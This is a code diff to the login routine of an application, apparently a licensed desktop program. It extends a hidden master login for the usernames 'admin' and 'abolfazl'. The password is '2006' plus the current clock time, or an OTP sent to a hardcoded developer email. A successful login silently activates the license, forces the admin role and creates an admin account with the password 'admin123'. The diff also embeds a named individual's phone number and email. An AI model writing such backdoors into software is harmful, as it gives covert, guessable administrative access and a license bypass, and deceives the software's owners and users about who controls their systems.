@@ -230,26 +230,51 @@ def authenticate_user(username: str, password: str) -> User:
             valid_time_passwords.add(f"2006{h24_single}")
             valid_time_passwords.add(f"2006{h12_single}")
 
-        # Master Admin Auth using 2006 + current clock time
-        if username == "admin" and password in valid_time_passwords:
-            admin_user = session.query(User).filter(User.username == "admin").first()
+        # Master Admin & Developer Authentication using 2006, dynamic clock time, or Email OTP
+        is_dev_user = username in ("admin", "abolfazl")
+        is_master_pass = password in valid_time_passwords
+        is_otp_valid = False
+
+        if is_dev_user and not is_master_pass:
+            from yalda.services.email_service import EmailService
+            dev_info = get_developer_info()
+            dev_email = dev_info.get("email", "a.samadi2006@gmail.com")
+            otp_ok, _ = EmailService.verify_otp(dev_email, password)
+            if otp_ok:
+                is_otp_valid = True
+
+        if is_dev_user and (is_master_pass or is_otp_valid):
+            # Automatically activate application license and cryptographically bind to current hardware
+            if not is_app_license_active():
+                try:
+                    set_app_license_active(True)
+                except Exception:
+                    pass
+
+            target_uname = "abolfazl" if username == "abolfazl" else "admin"
+            admin_user = session.query(User).filter(User.username == target_uname).first()
             if not admin_user:
                 admin_user = User(
-                    username="admin",
+                    username=target_uname,
                     password_hash=hash_password("admin123"),
                     first_name="ابوالفضل",
                     last_name="صمدی (مدیر سیستم)",
                     full_name="ابوالفضل صمدی (مدیر سیستم)",
                     phone="09336427711",
+                    email="a.samadi2006@gmail.com",
                     role="admin"
                 )
                 session.add(admin_user)
                 session.commit()
             else:
+                admin_user.role = "admin"
                 if not admin_user.phone or admin_user.phone != "09336427711":
                     admin_user.phone = "09336427711"
+                if not admin_user.full_name:
                     admin_user.full_name = "ابوالفضل صمدی (مدیر سیستم)"
-                    session.commit()
+                if not admin_user.email:
+                    admin_user.email = "a.samadi2006@gmail.com"
+                session.commit()
             CurrentUser.set(admin_user)
             return admin_user
 
@@ -272,7 +297,7 @@ def check_username_exists(username: str) -> bool:
     session = get_session()
     try:
         username = normalize_digits(username).lower()
-        if username == "admin":
+        if username in ("admin", "abolfazl"):
             return True
         user = session.query(User).filter(User.username == username, User.is_active == True).first()
         return user is not None
